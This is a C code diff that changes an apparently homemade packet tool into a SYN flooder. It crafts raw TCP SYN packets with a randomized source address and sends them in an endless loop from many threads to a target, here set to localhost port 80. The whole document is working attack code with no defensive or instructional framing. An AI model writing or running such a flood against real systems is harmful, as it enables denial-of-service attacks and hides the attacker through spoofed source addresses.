@@ -1,6 +1,6 @@
 #include "packets.h"
 
-void *thread_handler(){
+void *thread_handler(void *arg){
     const char *server_ip = "127.0.0.1";
     uint16_t port = 80;
 
@@ -26,8 +26,8 @@ void *thread_handler(){
 
     fill_SYN(iphead, tcphead, dest_addr.sin_addr.s_addr, dest_addr.sin_port);
 
-    srand(time(NULL));
-    randomize_src(iphead, rand());
+    uint32_t *rand = (uint32_t *) arg;
+    randomize_src(iphead, *rand);
 
     byte *ip_stream = serialize_ip_header(iphead);
     byte *tcp_stream = serialize_tcp_header(tcphead);
@@ -39,12 +39,14 @@ void *thread_handler(){
     hexDump(syn, syn_len);
     printf("\nPacket length: %lu\n\n", syn_len);
     update_checksums(syn);
-
-    if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
-        perror("sendto error");
-        exit(EXIT_FAILURE);
-    }else{
-        printf("Sent successfully\n");
+    while(1){
+        if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
+            perror("sendto error");
+            exit(EXIT_FAILURE);
+        }else{
+            printf("Sent successfully\n");
+        }
+        sleep(1);
     }
     close(sd);
     return NULL;
@@ -52,8 +54,11 @@ void *thread_handler(){
 
 int main() {
     pthread_t ptid;
+    srand(time(NULL));
+    uint32_t randnum = rand();
+
     for(int i = 0; i < IO_LIMIT; i++){
-        int pt = pthread_create(&ptid, NULL, thread_handler, NULL);
+        int pt = pthread_create(&ptid, NULL, thread_handler, (void *) &randnum);
         if(pt != 0){
             perror("pthread error");
         }
